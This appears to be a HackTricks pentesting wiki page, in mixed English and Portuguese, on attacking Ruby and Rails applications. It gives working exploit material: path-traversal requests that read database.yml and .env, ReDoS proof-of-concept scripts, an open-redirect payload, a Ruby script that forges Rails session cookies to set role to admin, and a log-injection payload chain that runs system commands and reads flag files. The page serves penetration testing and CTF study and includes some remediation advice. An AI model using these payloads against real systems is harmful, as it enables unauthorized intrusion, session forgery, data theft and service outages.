# Ruby Tricks

{{#include ../../banners/hacktricks-training.md}}

## File upload to RCE

As explained in [this article](https://www.offsec.com/blog/cve-2024-46986/), uploading a `.rb` file into sensitive directories such as `config/initializers/` can lead to remote code execution (RCE) in Ruby on Rails applications.

Tips:
- Outras localizações executadas no boot/eager-load que sejam writeable também são arriscadas (por exemplo, `config/initializers/` é a clássica). Se encontrar um upload arbitrário de arquivo que caia em qualquer lugar sob `config/` e for posteriormente avaliado/required, você pode obter RCE no boot.
- Procure builds de dev/staging que copiem arquivos controlados pelo usuário para a imagem do container onde Rails os carregará no boot.

## Active Storage image transformation → command execution (CVE-2025-24293)

When an application uses Active Storage with `image_processing` + `mini_magick`, and passes untrusted parameters to image transformation methods, Rails versions prior to 7.1.5.2 / 7.2.2.2 / 8.0.2.1 could allow command injection because some transformation methods were mistakenly allowed by default.

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
where `params[:t]` and/or `params[:v]` are attacker-controlled.

- What to try during testing
- Identify any endpoints that accept variant/processing options, transformation names, or arbitrary ImageMagick arguments.
- Fuzz `params[:t]` and `params[:v]` for suspicious errors or execution side-effects. If you can influence the method name or pass raw arguments that reach MiniMagick, you may get code exec on the image processor host.
- If you only have read-access to generated variants, attempt blind exfiltration via crafted ImageMagick operations.

- Remediation/detections
- If you see Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 with Active Storage + `image_processing` + `mini_magick` and user-controlled transformations, consider it exploitable. Recommend upgrading and enforcing strict allowlists for methods/params and a hardened ImageMagick policy.

## Rack::Static LFI / path traversal (CVE-2025-27610)

If the target stack uses Rack middleware directly or via frameworks, versions of `rack` prior to 2.2.13, 3.0.14, and 3.1.12 allow Local File Inclusion via `Rack::Static` when `:root` is unset/misconfigured. Encoded traversal in `PATH_INFO` can expose files under the process working directory or an unexpected root.

- Hunt for apps that mount `Rack::Static` in `config.ru` or middleware stacks. Try encoded traversals against static paths, for example:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
Adjust the prefix to match configured `urls:`. If the app responds with file contents, you likely have LFI to anything under the resolved `:root`.

- Mitigation: upgrade Rack; ensure `:root` only points to a directory of public files and is explicitly set.

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` and < `2.2.8.1` spent super-linear time parsing crafted `Content-Type: multipart/form-data` headers. A single POST with a gigantic `A=` parameter list can peg a Puma/Unicorn worker and cause DoS or request queue starvation.

- Quick PoC (will hang one worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Works against any Rack-based stack (Rails/Sinatra/Hanami/Grape). If fronted by nginx/haproxy with keep-alive, repeat in parallel to exhaust workers.
- Patched by making parser linear; look for `rack` gem version < `3.0.9.1` or < `2.2.8.1`. In assessments, point out that WAFs rarely block this because the header is syntactically valid.

## REXML XML parser ReDoS (CVE-2024-49761)

The REXML gem < 3.3.9 (Ruby 3.1 and earlier) catastrophically backtracks when parsing hex numeric character references containing long digit runs (e.g., `&#1111111111111x41;`). Any XML processed by REXML or libraries that wrap it (SOAP/XML API clients, SAML, SVG uploads) can be abused for CPU exhaustion.

Minimal trigger against a Rails endpoint that parses XML:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
Se o processo permanecer ocupado por segundos e a CPU do worker disparar, provavelmente está vulnerável. O ataque consome pouca largura de banda e também afeta tarefas em segundo plano que ingerem XML.

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

Aplicações que usam a gem `cgi` (padrão em muitas stacks Rack) podem ser travadas com um único cabeçalho malicioso:
- `CGI::Cookie.parse` estava super-linear; strings de cookie enormes (milhares de delimitadores) provocam comportamento O(N²).
- `CGI::Util#escapeElement` regex permitia ReDoS no escape de HTML.

Ambos os problemas foram corrigidos em `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. Para pentests, envie um cabeçalho `Cookie:` massivo ou alimente HTML não confiável para código helper e observe o travamento do worker. Combine com keep-alive para amplificar.

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

A gem `googlesign_in` < 1.3.0 (usada para Google OAuth em Rails) realizou uma verificação same-origin incompleta no parâmetro `proceedto`. Uma URL malformada como `proceedto=//attacker.com/%2F..` contorna a verificação e redireciona o usuário para fora, preservando cookies flash/session do Rails.

Exploit flow:
1. A vítima clica em um link de Google Sign-In forjado hospedado pelo atacante.
2. Após a autenticação, a gem redireciona para um domínio controlado pelo atacante, leaking flash notices ou quaisquer dados armazenados em cookies com escopo para o domínio curinga.
3. Se a app armazenar tokens de curta duração ou magic links no flash, isso pode ser transformado em account takeover.

Durante os testes, grep Gemfile.lock por `googlesign_in` < 1.3.0 e tente valores malformados em `proceedto`. Confirme via cabeçalho Location e reflexão de cookies.

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails encripta e assina cookies usando chaves derivadas de `secret_key_base`. Se esse valor vazar (por exemplo, em um repo, logs, ou credenciais mal configuradas), normalmente você pode descriptografar, modificar e recriptografar os cookies. Isso frequentemente leva a bypass de authz se a app armazenar roles, user IDs, ou feature flags nos cookies.

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby to decrypt/forge cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
Notas:
- Apps mais antigos podem usar AES-256-CBC e salts `encrypted cookie` / `signed encrypted cookie`, ou JSON/Marshal serializers. Ajuste salts, cipher e serializer conforme necessário.
- Em caso de compromise/assessment, rotacione `secret_key_base` para invalidar todos os cookies existentes.

## Veja também (Ruby/Rails-specific vulns)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

When an app (often a simple Rack/Sinatra/Rails endpoint) both:
- registra literalmente uma string controlada pelo usuário, e
- posteriormente `load`s um arquivo cujo caminho é derivado dessa mesma string (após `Pathname#cleanpath`),

You can often achieve remote code execution by poisoning the log and then coercing the app to `load` the log file. Primitivas chave:

- Ruby `load` avalia o conteúdo do arquivo alvo como Ruby independentemente da extensão do arquivo. Any readable text file whose contents parse as Ruby will be executed.
- `Pathname#cleanpath` colapsa os segmentos `.` e `..` sem acessar o filesystem, permitindo path smuggling: attacker-controlled junk can be prepended for logging while the cleaned path still resolves to the intended file to execute (e.g., `../logs/error.log`).

### Padrão vulnerável mínimo
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### Por que o log pode conter Ruby válido
`Logger` escreve linhas de prefixo como:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
Em Ruby, `#` inicia um comentário e `9/2/2025` é apenas aritmética. Para injetar código Ruby válido você precisa:
- Comece seu payload em uma nova linha para que não seja comentado pelo `#` na linha INFO; envie uma nova linha inicial (`\n` ou `%0A`).
- Feche o `[` pendente introduzido pela linha INFO. Um truque comum é começar com `]` e, opcionalmente, deixar o parser satisfeito com `][0]=1`.
- Em seguida coloque código Ruby arbitrário (por exemplo, `system(...)`).

Exemplo do que vai acabar no log após uma requisição com um parâmetro forjado:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### Contrabandeando uma única string que tanto registra código quanto resolve para o caminho do log
Queremos uma única string controlada pelo atacante que:
- quando for registrada raw, contenha nosso Ruby payload, e
- quando passada por `Pathname.new(<input>).cleanpath`, resolva para `../logs/error.log`, de modo que o subsequente `load` execute o arquivo de log recém-envenenado.

`Pathname#cleanpath` ignora schemes e colapsa componentes de travessia, então o seguinte funciona:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- O `#` antes de `://` garante que Ruby ignore o restante quando o log for executado, enquanto `cleanpath` ainda reduz o sufixo para `../logs/error.log`.
- A nova linha inicial quebra a linha INFO; `]` fecha o colchete pendente; `][0]=1` satisfaz o parser.

### Exploração ponta a ponta
1. Send the following as the backup script name (URL-encode the first newline as `%0A` if needed):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. O app registra sua string bruta em `logs/error.log`.
3. O app calcula `cleanpath`, que resolve para `../logs/error.log` e chama `load` nele.
4. Ruby executa o código que você injetou no log.

Para exfiltrar um arquivo em um ambiente semelhante a CTF:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (primeiro caractere é uma nova linha):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## Referências

- [Rails Security Announcement: CVE-2025-24293 Active Storage unsafe transformation methods (fixed in 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub Advisory: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath docs](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [How Ruby load works](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS advisory (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Ruby security advisories for CGI / URI (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
